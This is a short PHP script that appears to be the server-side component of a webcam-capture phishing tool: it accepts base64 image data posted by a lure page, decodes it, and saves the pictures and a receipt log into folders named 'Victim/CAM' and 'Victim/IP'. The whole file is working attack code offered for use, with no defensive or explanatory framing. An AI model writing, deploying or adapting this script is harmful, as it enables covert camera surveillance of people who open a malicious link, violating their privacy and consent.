<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];

$camDir = dirname(__DIR__) . '/Victim/CAM';
$ipDir  = dirname(__DIR__) . '/Victim/IP';
if (!is_dir($camDir)) {
    mkdir($camDir, 0777, true);
}
if (!is_dir($ipDir)) {
    mkdir($ipDir, 0777, true);
}

if (!empty($_POST['cat'])) {
    error_log("Received" ."$date". "\r\n", 3, $ipDir . "/log.txt");

}

$filteredData=substr($imageData, strpos($imageData, ",") +1);
$unencodedData=base64_decode($filteredData);
$fp = fopen($camDir . '/FLOWERS-'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

exit();
?>
